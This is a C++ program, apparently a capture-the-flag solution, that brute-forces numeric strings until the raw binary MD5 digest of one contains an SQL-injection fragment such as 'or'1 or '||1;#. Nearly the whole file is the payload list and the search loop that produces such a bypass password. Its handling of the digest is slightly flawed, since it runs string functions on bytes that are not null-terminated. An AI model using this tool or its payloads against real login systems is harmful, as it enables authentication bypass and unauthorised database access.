#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/md5.h>
#include <string>

using namespace std;

//note: used http://www.askyb.com/cpp/openssl-md5-hashing-example-in-cpp/ to figure out how to create an MD5 hash in C++

//to compile: g++ -I/usr/local/opt/openssl/include -L/usr/local/opt/openssl/lib -lcrypto -lssl -o find sql_2.cpp
 
int main()
{
    unsigned char digest[MD5_DIGEST_LENGTH];
    int input = 1;
    char string[] = "ridh74hdks92jfn648s48ncsk53dsa1";  //random stuff of size 32

    char hacker[] = "\'<>\'";
    char hacker2[] = "\'or\'1";
    char hacker3[] = "\'||1;#";
    char hacker4[] = "\'||\'1";
    char hacker5[] = "\'OR\'1";
    char hacker6[] = "\'oR\'1";
    char hacker7[] = "\'Or\'1";

    unsigned char * hash;

    srand(time(NULL));

    //unsigned int a = 1;
    unsigned int a = 894634425; //note: started at one during first search

    while(true){

        a += 1;

        strcpy(string, to_string(a).c_str());

        printf("%s\n", string);

        hash = MD5((unsigned char*)&string, strlen(string), (unsigned char*)&digest);

        if (strstr((char*)hash, hacker) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker2) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker3) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker4) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker5) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker6) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    

        if (strstr((char*)hash, hacker7) != NULL){ // if the hash contains the sql injection
            printf("%s\n", "FOUND IT: ");
            printf("%s", hash);
            exit(0);
        }
    }
 
    return 0;
}